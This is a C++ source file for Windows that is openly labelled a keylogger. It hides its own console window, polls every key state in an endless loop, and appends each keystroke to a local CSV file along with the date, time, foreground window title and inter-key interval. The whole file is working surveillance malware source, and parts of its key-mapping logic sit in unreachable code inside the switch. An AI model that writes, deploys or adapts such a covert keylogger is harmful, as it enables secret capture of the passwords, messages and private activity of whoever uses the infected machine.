#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <chrono>

using namespace std;

void StealthMode();
void StartLogging();
uint64_t timeSinceEpochMillisec();

uint64_t timeSinceEpochMillisec() {
    using namespace std::chrono;
    return duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
}

int main() {
    StealthMode();
    StartLogging();

    return 0;
}

void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void StartLogging() {
    char c;
    string final = "";
    char windowTitle[256] = "";

    cout << "Keylogger Started " << endl;

    auto prevTimestamp = std::chrono::high_resolution_clock::now();

    while (true) {
        HWND foregroundWindow = GetForegroundWindow();
        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));

        //auto currentTimestamp = std::chrono::high_resolution_clock::now();

        uint64_t time = timeSinceEpochMillisec();
        
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {

                auto currentTimestamp = std::chrono::high_resolution_clock::now();
                auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(currentTimestamp - prevTimestamp);
                auto timestamp = std::chrono::system_clock::to_time_t(currentTimestamp);
                std::tm* localTime = std::localtime(&timestamp);

                char dateStr[11];
                std::strftime(dateStr, sizeof(dateStr), "%Y-%m-%d", localTime);

                char timeStr[9];
                std::strftime(timeStr, sizeof(timeStr), "%H:%M:%S", localTime);

                ofstream write("Record3.csv", ios::app);
                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    //c += 32;
                    //write << c << "," << time << "\n";
                    //write.close();
                    final += (c + 32);
                    //break;
                }

                else if ((c > 64) && (c < 91))
                {
                    final += c;
                    //write << c << "," << time << "\n";
                    //write.close();
                    //break;
                }

                else 
                {
                    switch (c) 
                    {
                        if (!GetAsyncKeyState(0x10)) {
                            final += c;
                        }
                        else {
                            case 48:
                                final += ")";
                                break;
                            
                            case 49:
                                final += "!";
                                break;

                            case 50:
                                final += "@";
                                break;

                            case 51:
                                final += "#";
                                break;

                            case 52:
                                final += "$";
                                break;

                            case 53:
                                final += "%";
                                break;

                            case 54:
                                final += "^";
                                break;

                            case 55:
                                final += "&";
                                break;

                            case 56:
                                final += "*";
                                break;
                            
                            case 57:
                                final += "(";
                                break;

                            case VK_LBUTTON:
                                final += "<LEFT CLICK>";
                                break;
                            
                            case VK_RBUTTON:
                                final += "<RIGHT CLICK>";
                                break;

                            case VK_ESCAPE:
                                final += "<ESC>";
                                break;
                            
                            case VK_SPACE:
                                final += "<SPACE>";
                                break;

                            case VK_RETURN:
                                final += "<RETURN>";
                                break;

                            case VK_TAB:
                                final += "<TAB>";
                                break;

                            case VK_BACK:
                                final += "<BACKSPACE>";
                                break;

                            case VK_DELETE:
                                final += "<DEL>";
                                break;

                            default:
                                final += (char)c;
                                break;
                        }
                    }
                }
                write << dateStr << ","
                    << timeStr << ","
                    << final << ","
                    << windowTitle << ","
                    << interval.count() << endl;

                final = "";
                prevTimestamp = currentTimestamp;


            }
        }
    }
}
